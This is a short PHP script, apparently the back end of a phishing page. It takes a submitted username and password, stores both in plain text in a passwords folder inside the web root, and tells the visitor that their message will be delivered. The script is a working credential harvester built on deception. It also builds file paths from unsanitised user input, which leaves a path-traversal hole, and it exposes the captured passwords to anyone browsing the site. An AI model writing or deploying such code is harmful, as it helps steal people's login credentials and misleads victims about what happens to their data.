<?php
        $filename =  "/var/www/html/passwords/".$_POST["uname"]." - ".time();
        // Open the file to get existing content
                $current = file_get_contents($filename);
        // Append a new person to the file
                $current .= $_POST["uname"]." - ".$_POST["password"]."\n";
        // Write the contents back to the file
                file_put_contents($filename, $current);
?>

Messsage has been stored and will be delivered